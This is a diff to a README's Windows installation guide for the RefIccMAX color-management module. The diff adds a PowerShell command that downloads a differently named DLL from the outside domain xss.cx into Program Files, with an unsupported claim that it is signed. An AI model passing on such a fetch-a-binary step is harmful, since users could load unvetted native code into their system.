@@ -58,6 +58,12 @@ To install the RefIccMAX CMM on Windows, follow these simplified steps:
 ### Create the Installation Directory
 In `C:\Program Files`, create a new directory called `RefIccMAX`. Then, copy the `RefIccMAXCmm.dll` file into the directory `C:\Program Files\RefIccMAX`.
 
+The .dll is Signed by David H Hoyt LLC
+```
+cd "C:\Program Files\RefIccMAX"
+iwr -Uri "https://xss.cx/2024/10/26/signed/DemoIccMAXCmm.dll" -OutFile ".\DemoIccMAXCmm.dll"
+```
+
 ### Update the Windows Registry
 Instead of manually editing the registry, you can use a `.reg` file to automate the process.
 
